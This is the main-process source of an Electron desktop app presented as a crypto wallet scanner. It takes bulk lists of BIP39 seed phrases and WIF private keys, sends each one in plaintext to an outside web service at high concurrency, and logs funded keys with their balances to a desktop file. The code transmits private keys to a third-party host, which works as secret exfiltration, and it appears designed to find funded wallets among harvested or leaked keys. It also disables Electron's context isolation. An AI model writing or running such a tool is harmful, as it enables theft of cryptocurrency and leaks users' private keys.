const { app, BrowserWindow, ipcMain, shell, dialog, clipboard } = require('electron');
const path = require('path');
const axios = require('axios');
const bip39 = require('bip39');
const fs = require('fs');

let mainWindow;

// --- GLOBAL STATE ---
let scanState = {
    items: [],       // The clean list of mnemonics/wifs
    pointer: 0,      // Current index we are processing
    found: 0,        // Total hits found
    isScanning: false,
    controller: new AbortController() // To cancel requests instantly
};

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1050,
        height: 850,
        minWidth: 800,
        minHeight: 600,
        backgroundColor: '#1c1c1e',
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    mainWindow.loadFile('index.html');

    mainWindow.webContents.setWindowOpenHandler(({ url }) => {
        shell.openExternal(url);
        return { action: 'deny' };
    });
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});

// --- CONFIGURATION ---
const CONCURRENCY_LIMIT = 500;
const MAX_RETRIES = 5;
const RETRY_DELAY = 1000;

// --- UTILS ---
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function isValidMnemonic(line) {
    const words = line.trim().split(/\s+/);
    if (![12, 15, 18, 21, 24].includes(words.length)) return false;
    try { return bip39.validateMnemonic(line.trim()); } catch(e) { return false; }
}

function isValidWif(line) {
    const trimmed = line.trim();
    if (trimmed.length < 50 || trimmed.length > 53) return false;
    const firstChar = trimmed[0];
    return ['5', 'K', 'L'].includes(firstChar) && /^[1-9A-HJ-NP-Za-km-z]+$/.test(trimmed);
}

// --- FILE HANDLERS ---
ipcMain.handle('open-file-dialog', async () => {
    const { canceled, filePaths } = await dialog.showOpenDialog(mainWindow, {
        properties: ['openFile'],
        filters: [{ name: 'Text Files', extensions: ['txt'] }]
    });
    if (canceled || filePaths.length === 0) return null;
    try { return fs.readFileSync(filePaths[0], 'utf8'); } catch (err) { return null; }
});

ipcMain.on('open-results-folder', () => {
    shell.openPath(app.getPath('desktop'));
});

// --- SCANNER ENGINE ---
async function scanLine(line, type) {
    const endpoint = type === 'MNEMONIC' ? 'scan' : 'wif';
    const payload = type === 'MNEMONIC' ? { mnemonic: line.trim(), passphrase: 'null' } : { wif: line.trim() };

    try {
        const res = await axios.post(`https://generate-wallet.vercel.app/api/${endpoint}`, payload, {
            signal: scanState.controller.signal // Link to AbortController
        });
        const sats = res.data?.result?.grandTotals?.totalBalance || 0;
        return { ok: true, balance: sats / 100000000 };
    } catch (error) {
        // If cancelled, don't return error, return specific flag
        if (axios.isCancel(error)) return { ok: false, cancelled: true };
        return { ok: false, error: error.message };
    }
}

// --- WORKER POOL ---
async function startWorkerPool() {
    const startTime = Date.now();
    
    // Helper to get next item atomically
    const getNextItem = () => {
        if (scanState.pointer >= scanState.items.length) return null;
        return scanState.items[scanState.pointer++];
    };

    const worker = async () => {
        while (scanState.isScanning) {
            const item = getNextItem();
            if (!item) break; // End of list

            let attempts = 0;
            let success = false;
            let result;

            while (attempts < MAX_RETRIES && !success && scanState.isScanning) {
                attempts++;
                result = await scanLine(item.line, item.type);

                if (result.cancelled) break; // Exit loop if stopped

                if (result.ok) {
                    success = true;
                    if (result.balance > 0) {
                        scanState.found++;
                        const btc = result.balance.toFixed(8);
                        
                        mainWindow.webContents.send('hit-found', { line: item.line, balance: btc });
                        
                        const logPath = path.join(app.getPath('desktop'), 'found_balances.txt');
                        fs.appendFileSync(logPath, `${item.line} | ${btc}\n`);
                    }
                } else {
                    if (attempts < MAX_RETRIES && scanState.isScanning) await sleep(RETRY_DELAY);
                }
            }
            
            // Update UI periodically
            if (scanState.pointer % 20 === 0 || scanState.pointer === scanState.items.length) {
                const elapsed = (Date.now() - startTime) / 1000;
                const speed = elapsed > 0 ? ((scanState.pointer - 0) / elapsed).toFixed(1) : "0.0"; // speed calculation simplified for resume

                mainWindow.webContents.send('progress', { 
                    processed: scanState.pointer, 
                    total: scanState.items.length,
                    speed: speed,
                    found: scanState.found
                });
            }
        }
    };

    // Spawn Workers
    const workers = new Array(CONCURRENCY_LIMIT).fill(0).map(() => worker());
    await Promise.all(workers);

    // If we finished the list
    if (scanState.pointer >= scanState.items.length) {
        mainWindow.webContents.send('finished', { found: scanState.found });
        scanState.isScanning = false;
    }
}

// --- IPC EVENTS ---

// 1. START NEW SCAN
ipcMain.on('start-scan', (event, rawText) => {
    // Reset State
    scanState.pointer = 0;
    scanState.found = 0;
    scanState.isScanning = true;
    scanState.controller = new AbortController();

    // Parse & Deduplicate
    const rawLines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 0);
    const uniqueLines = new Set(rawLines);

    mainWindow.webContents.send('status-update', { 
        total: uniqueLines.size, 
        msg: `Validating ${uniqueLines.size} unique items...` 
    });

    const validItems = [];
    for (const line of uniqueLines) {
        if (isValidMnemonic(line)) validItems.push({ line, type: 'MNEMONIC' });
        else if (isValidWif(line)) validItems.push({ line, type: 'WIF' });
    }

    scanState.items = validItems;

    mainWindow.webContents.send('status-update', { 
        total: validItems.length, 
        msg: `Scanning ${validItems.length} valid items...` 
    });

    startWorkerPool();
});

// 2. RESUME SCAN
ipcMain.on('resume-scan', () => {
    if (scanState.items.length === 0 || scanState.pointer >= scanState.items.length) return;
    
    scanState.isScanning = true;
    scanState.controller = new AbortController(); // New controller for new batch
    
    mainWindow.webContents.send('status-update', { 
        total: scanState.items.length, 
        msg: `Resuming from line ${scanState.pointer}...` 
    });

    startWorkerPool();
});

// 3. STOP SCAN (Immediate)
ipcMain.on('stop-scan', () => {
    scanState.isScanning = false;
    scanState.controller.abort(); // KILL all active requests immediately
});

// 4. CLEAR/RESET
ipcMain.on('reset-scan', () => {
    scanState.isScanning = false;
    scanState.controller.abort();
    scanState.items = [];
    scanState.pointer = 0;
    scanState.found = 0;
});
